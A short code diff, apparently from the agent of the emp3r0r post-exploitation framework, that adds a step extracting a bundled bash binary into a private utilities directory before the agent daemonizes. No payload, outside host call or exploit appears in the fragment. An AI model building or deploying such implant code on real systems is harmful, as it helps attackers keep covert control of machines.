@@ -62,12 +62,17 @@ func main() {
 		os.Setenv("HOME", u.HomeDir)
 	}
 
-	// mkdir -p
+	// mkdir -p UtilsPath
 	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
 		err = os.MkdirAll(emp3r0r_data.UtilsPath, 0700)
 		if err != nil {
 			log.Fatalf("[-] Cannot mkdir %s: %v", emp3r0r_data.AgentRoot, err)
 		}
+	}
+	// extract bash
+	err = agent.ExtractBash()
+	if err != nil {
+		log.Printf("[-] Cannot extract bash: %v", err)
 	}
 
 	// daemonize
